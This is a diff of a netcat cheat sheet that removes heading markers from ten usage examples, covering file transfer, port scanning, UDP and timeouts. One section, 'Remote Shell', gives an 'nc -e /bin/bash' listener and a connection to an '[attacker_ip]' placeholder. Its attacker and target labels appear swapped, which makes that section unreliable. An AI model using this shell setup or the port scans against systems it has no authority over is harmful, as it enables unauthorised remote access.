@@ -86,48 +86,48 @@ LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          users:(("sshd",p
 
 Netcat (or nc) is a versatile networking tool that is often referred to as the "Swiss Army knife" of networking. It is used for a variety of tasks involving network connections
 
-# 1. Basic Syntax
+1. Basic Syntax
 nc [options] [hostname] [port]
 
-# 2. Start a TCP Server
+2. Start a TCP Server
 nc -l -p 1234
 
-# 3. Connect to a TCP Server
+3. Connect to a TCP Server
 nc [hostname] 1234
 
-# 4. File Transfer
-# On the server (receiving):
+4. File Transfer
+On the server (receiving):
 nc -l -p 1234 > received_file
-# On the client (sending):
+On the client (sending):
 nc [server_ip] 1234 < file_to_send
 
-# 5. Port Scanning
+5. Port Scanning
 nc -zv [hostname] [port_range]
-# Example:
+Example:
 nc -zv localhost 20-80
 
-# 6. Simple Chat
-# Listener:
+6. Simple Chat
+Listener:
 nc -l -p 1234
-# Connector:
+Connector:
 nc [hostname] 1234
 
-# 7. UDP Mode
-# Send UDP packets:
+7. UDP Mode
+Send UDP packets:
 nc -u [hostname] 1234
-# Listen for UDP packets:
+Listen for UDP packets:
 nc -u -l -p 1234
 
-# 8. Remote Shell
-# Listener (attacker's machine):
+8. Remote Shell
+Listener (attacker's machine):
 nc -l -p 4444 -e /bin/bash
-# Client (target's machine):
+Client (target's machine):
 nc [attacker_ip] 4444
 
-# 9. Check if a Port is Open
+9. Check if a Port is Open
 nc -zv [hostname] [port]
-# Example:
+Example:
 nc -zv example.com 80
 
-# 10. Set a Timeout
+10. Set a Timeout
 nc -w 3 [hostname] 1234
